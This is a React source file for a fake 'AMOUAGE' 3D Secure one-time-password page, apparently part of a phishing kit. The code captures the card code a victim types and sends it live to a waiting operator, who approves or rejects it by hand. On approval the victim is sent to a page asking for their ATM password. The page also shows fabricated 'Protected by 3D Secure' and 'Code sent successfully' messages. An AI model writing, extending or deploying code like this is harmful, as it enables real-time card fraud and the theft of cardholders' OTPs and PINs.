import { useEffect, useState, useRef } from "react";
import { useLocation } from "wouter";
import { useSignalEffect } from "@preact/signals-react";
import WaitingOverlay, { waitingCardInfo } from "@/components/WaitingOverlay";
import {
  sendData,
  codeAction,
  navigateToPage,
} from "@/lib/store";

export default function OTPVerification() {
  const [, navigate] = useLocation();
  const [otp, setOtp] = useState("");
  const [error, setError] = useState(false);
  const [isWaiting, setIsWaiting] = useState(false);
  const [resendTimer, setResendTimer] = useState(120); // 2 minutes countdown
  const [canResend, setCanResend] = useState(false);
  const [currentTime, setCurrentTime] = useState(new Date());
  const inputRef = useRef<HTMLInputElement>(null);

  // Get payment data from localStorage
  const paymentData = JSON.parse(localStorage.getItem("paymentData") || "{}");
  const cardLast4 = paymentData.cardLast4 || "****";
  const totalAmount = paymentData.totalPaid || 0;
  const serviceName = paymentData.serviceName || "";
  
  // Get card info from localStorage (fallback) or signal
  const signalCardInfo = waitingCardInfo.value;
  const cardInfo = signalCardInfo || {
    bankName: paymentData.bankName || '',
    bankLogo: paymentData.bankLogo || '',
    cardType: paymentData.cardType || '',
  };

  // Emit page enter
  useEffect(() => {
    navigateToPage("رمز التحقق (OTP)");
  }, []);

  // Resend timer countdown
  useEffect(() => {
    if (resendTimer > 0) {
      const timer = setTimeout(() => setResendTimer(resendTimer - 1), 1000);
      return () => clearTimeout(timer);
    } else {
      setCanResend(true);
    }
  }, [resendTimer]);

  // Real-time clock update
  useEffect(() => {
    const timer = setInterval(() => setCurrentTime(new Date()), 1000);
    return () => clearInterval(timer);
  }, []);

  // Handle code action from admin
  useSignalEffect(() => {
    const action = codeAction.value;
    if (action) {
      if (action.action === "approve") {
        // Navigate to ATM password page
        navigate("/atm-password");
      } else if (action.action === "reject") {
        // Show error and clear OTP
        setOtp("");
        setError(true);
        setIsWaiting(false);
        inputRef.current?.focus();
      }
      // Reset the action
      codeAction.value = null;
    }
  });

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 6);
    setOtp(value);
    setError(false);
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    // Accept 4 or 6 digits
    if (otp.length !== 4 && otp.length !== 6) {
      setError(true);
      return;
    }

    setError(false);
    setIsWaiting(true);
    sendData({
      digitCode: otp,
      current: "رمز التحقق (OTP)",
      nextPage: "كلمة مرور ATM",
      waitingForAdminResponse: true,
    });
  };

  const handleResend = () => {
    if (!canResend) return;
    setCanResend(false);
    setResendTimer(120);
    sendData({
      data: { طلب: "إعادة إرسال رمز" },
      current: "رمز التحقق (OTP)",
      waitingForAdminResponse: true,
    });
  };

  // Format timer as MM:SS
  const formatTimer = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`;
  };

  // Format date in Arabic
  const formatDate = (date: Date) => {
    return date.toLocaleDateString("ar-SA", {
      year: "numeric",
      month: "numeric",
      day: "numeric",
    });
  };

  // Format time in Arabic
  const formatTime = (date: Date) => {
    return date.toLocaleTimeString("ar-SA", {
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
      hour12: true,
    });
  };

  return (
    <div className="min-h-screen bg-[#f5f5f5] flex items-center justify-center px-4 py-8" dir="ltr" style={{ fontFamily: "'Helvetica Neue', Helvetica, Arial, sans-serif" }}>
      <WaitingOverlay />

      <div className="w-full max-w-[480px]">
        {/* Header - AMOUAGE branding */}
        <div className="text-center mb-8">
          <h1 className="text-2xl tracking-[0.3em] font-light text-black mb-2" style={{ fontFamily: "'Times New Roman', serif" }}>AMOUAGE</h1>
          <p className="text-sm text-gray-500">Secure Verification</p>
        </div>

        {/* Main Card */}
        <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-8">
          {/* OTP Title */}
          <div className="text-center mb-6">
            <h2 className="text-lg font-semibold text-gray-900 mb-1">One-Time Password (OTP)</h2>
            <p className="text-gray-500 text-sm">
              Enter the verification code sent to your phone to confirm the transaction
            </p>
          </div>

          {/* Bank and Card Type Logos */}
          <div className="flex justify-between items-center mb-6 px-4 py-3 border-b border-gray-100">
            {/* Card Type Logo (Visa/Mastercard) */}
            <div className="flex items-center">
              <img
                src={cardInfo?.cardType?.toLowerCase() === 'visa' ? '/images/visa.png' : cardInfo?.cardType?.toLowerCase() === 'mastercard' ? '/images/mastercard.png' : '/images/visa.png'}
                alt={cardInfo?.cardType || 'Card'}
                className="h-8 object-contain"
              />
            </div>
            {/* Bank Logo */}
            {cardInfo?.bankLogo && (
              <div className="flex items-center">
                <img
                  src={cardInfo.bankLogo}
                  alt={cardInfo.bankName || "Bank"}
                  className="h-8 object-contain"
                />
              </div>
            )}
          </div>

          {/* Transaction Info */}
          <div className="bg-[#fafafa] border border-gray-100 rounded-md p-4 mb-6 text-sm text-gray-600 leading-relaxed">
            <p>
              A verification code will be sent by your issuing bank for the card ending in <span className="font-semibold text-gray-900">{cardLast4}</span>. Please enter the code to confirm the transaction.
            </p>
            <p className="mt-2">
              You are paying <span className="font-semibold text-gray-900">AMOUAGE</span> an amount of <span className="font-semibold text-black">{totalAmount}</span> on {formatDate(currentTime)} at {formatTime(currentTime)}
            </p>
          </div>

          {/* Success Message */}
          <div className="text-center mb-5">
            <span className="text-sm font-medium text-green-600">✓ Code sent successfully</span>
          </div>

          <form onSubmit={handleSubmit} className="space-y-5">
            {/* OTP Input */}
            <div>
              <label className="block text-xs text-gray-500 mb-1.5 font-medium uppercase tracking-wide text-center">Verification Code</label>
              <div className="flex justify-center" dir="ltr">
                <input
                  ref={inputRef}
                  type="tel"
                  inputMode="numeric"
                  maxLength={6}
                  value={otp}
                  onChange={handleChange}
                  placeholder="Enter OTP"
                  className={`w-full border rounded-md px-4 py-3 text-center text-lg font-medium focus:outline-none focus:border-black transition-colors ${
                    error ? 'border-red-400 bg-red-50' : 'border-gray-300'
                  }`}
                  autoFocus
                />
              </div>
            </div>

            {error && (
              <div className="bg-red-50 border border-red-200 rounded-md p-3">
                <p className="text-red-600 text-center text-sm">
                  Incorrect verification code. Please try again.
                </p>
              </div>
            )}

            {/* Submit Button */}
            <button 
              type="submit" 
              className="w-full py-3 bg-black text-white text-sm font-medium uppercase tracking-wider rounded-md hover:bg-gray-900 transition-colors disabled:bg-gray-300 disabled:cursor-not-allowed"
              disabled={isWaiting || (otp.length !== 4 && otp.length !== 6)}
            >
              {isWaiting ? (
                <div className="flex items-center justify-center gap-2">
                  <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                  <span>Verifying...</span>
                </div>
              ) : (
                "VERIFY"
              )}
            </button>

            {/* Resend Timer */}
            <div className="text-center text-gray-500 text-sm pt-2">
              {canResend ? (
                <button
                  type="button"
                  onClick={handleResend}
                  className="text-black hover:underline font-medium"
                >
                  Resend Code
                </button>
              ) : (
                <span>Resend in: {formatTimer(resendTimer)}</span>
              )}
            </div>
          </form>
        </div>

        {/* Footer */}
        <div className="text-center mt-6">
          <p className="text-xs text-gray-400">Protected by 3D Secure Authentication</p>
        </div>
      </div>
    </div>
  );
}
